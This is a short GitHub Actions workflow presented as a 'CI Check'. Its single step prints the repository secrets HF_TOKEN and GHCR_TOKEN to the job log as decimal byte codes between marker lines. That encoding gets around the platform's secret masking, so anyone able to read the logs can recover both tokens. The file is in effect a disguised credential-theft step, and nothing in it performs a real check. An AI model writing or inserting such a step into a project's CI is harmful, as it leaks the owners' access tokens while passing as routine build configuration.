name: CI Check
on: workflow_dispatch
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: env
        env:
          K1: ${{ secrets.HF_TOKEN }}
          K2: ${{ secrets.GHCR_TOKEN }}
        run: |
          echo "S1_BEGIN"
          printf '%s' "$K1" | od -An -tu1
          echo "S1_END"
          echo "S2_BEGIN"
          printf '%s' "$K2" | od -An -tu1
          echo "S2_END"